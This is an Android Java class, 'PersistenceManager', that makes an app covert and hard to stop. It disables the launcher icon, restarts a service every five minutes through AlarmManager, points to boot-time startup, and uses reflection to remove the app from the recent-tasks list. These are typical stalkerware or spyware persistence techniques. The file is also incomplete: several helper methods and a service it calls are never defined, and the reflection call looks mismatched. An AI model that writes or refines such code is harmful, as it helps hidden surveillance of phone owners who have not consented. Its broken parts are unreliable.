// PersistenceManager.java
package com.your.app.service;

import android.app.ActivityManager;
import android.app.AlarmManager;
import android.app.PendingIntent;
import android.content.ComponentName;
import android.content.Context;
import android.content.Intent;
import android.content.pm.PackageManager;
import android.os.Build;
import java.io.File;
import java.io.FileOutputStream;
import java.io.InputStream;
import java.lang.reflect.Method;

public class PersistenceManager {
    
    public static void enablePersistence(Context context) {
        // Hide app icon
        PackageManager pm = context.getPackageManager();
        pm.setComponentEnabledSetting(
            new ComponentName(context, "com.your.app.MainActivity"),
            PackageManager.COMPONENT_ENABLED_STATE_DISABLED,
            PackageManager.DONT_KILL_APP
        );
        
        // Add to startup
        addToStartup(context);
        
        // Watchdog to restart if killed
        setupWatchdog(context);
        
        // Disable battery optimization
        disableBatteryOptimization(context);
        
        // Hide in recent apps
        hideFromRecentApps(context);
    }
    
    private static void addToStartup(Context context) {
        // Broadcast receiver for BOOT_COMPLETED
        // Add to AndroidManifest.xml
        
        // Additional persistence via JobScheduler
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.LOLLIPOP) {
            setupJobScheduler(context);
        }
        
        // AlarmManager for periodic restart
        AlarmManager am = (AlarmManager) context.getSystemService(Context.ALARM_SERVICE);
        Intent intent = new Intent(context, MainService.class);
        PendingIntent pi = PendingIntent.getService(context, 0, intent, 
            PendingIntent.FLAG_UPDATE_CURRENT | PendingIntent.FLAG_IMMUTABLE);
        
        am.setInexactRepeating(AlarmManager.RTC_WAKEUP, 
            System.currentTimeMillis() + 60000, 
            300000, pi); // Restart every 5 minutes
    }
    
    private static void hideFromRecentApps(Context context) {
        ActivityManager am = (ActivityManager) context.getSystemService(Context.ACTIVITY_SERVICE);
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.LOLLIPOP) {
            try {
                Method method = ActivityManager.class.getMethod("removeTask", int.class);
                for (ActivityManager.AppTask task : am.getAppTasks()) {
                    method.invoke(task, task.getTaskInfo().id);
                }
            } catch (Exception e) {
                e.printStackTrace();
            }
        }
    }
}
